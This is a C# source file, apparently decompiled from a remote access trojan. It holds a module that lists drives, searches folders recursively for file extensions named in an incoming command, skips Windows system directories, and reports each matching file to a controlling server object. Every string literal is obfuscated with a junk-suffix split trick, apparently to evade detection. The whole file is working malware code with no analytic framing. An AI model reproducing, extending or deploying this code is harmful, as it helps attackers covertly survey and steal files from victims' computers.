using System;
using System.Collections.Generic;
using System.IO;

namespace rmtadrm;

internal class wrmstimzDRIVF
{
	public wrmstimzMCDM iserver;

	public List<string> wrmstimzfExts = new List<string>();

	public List<string> wrmstimznotFilders = new List<string>();

	public string wrmstimzmainPath;

	public int wrmstimzsIndx = 0;

	public string wrmstimzfilesLogs = wrmstimzCONF.wrmstimzfilesLogs;

	public int wrmstimzfIndx = 0;

	public bool wrmstimzreaging = false;

	public List<string> wrmstimzsFiles = new List<string>();

	public IEnumerable<string> wrmstimzaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.wrmstimzautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (wrmstimzseeAccess(text) && !wrmstimznotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool wrmstimzseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public wrmstimzDRIVF()
	{
		wrmstimznotFilders.Add("clients_data|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("program files|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("system volume information|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("$recycle.bin|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("msocache|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("recoveDSDF|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("documents and settings|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("windows|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("program files (x86)|wrmstimz".Split(new char[1] { '|' })[0]);
		wrmstimznotFilders.Add("programdata|wrmstimz".Split(new char[1] { '|' })[0]);
	}

	public void wrmstimzlookFiles(string tempStr)
	{
		iserver.wrmstimzautCnls = false;
		wrmstimzfExts.Clear();
		wrmstimzsFiles.Clear();
		wrmstimzfIndx = 0;
		wrmstimzsIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				wrmstimzfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			wrmstimzreaging = true;
			wrmstimzsendSearch(array[1]);
			wrmstimzreaging = false;
			iserver.wrmstimzpush_data(null, "wrmstimz-seard=searched|wrmstimz".Split(new char[1] { '|' })[0]);
		}
	}

	public string wrmstimzcheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (wrmstimzseeAccess(text2))
				{
					text = text + text2 + ">|wrmstimz".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void wrmstimzsendSearch(string path)
	{
		try
		{
			foreach (string item in wrmstimzaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (wrmstimzfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.wrmstimzfile_info(item, ret: true);
					iserver.wrmstimzpush_data(null, "wrmstimz-searf=|wrmstimz".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|wrmstimz".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.wrmstimzautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string wrmstimzlookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|wrmstimz".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string wrmstimzlookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|wrmstimz".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
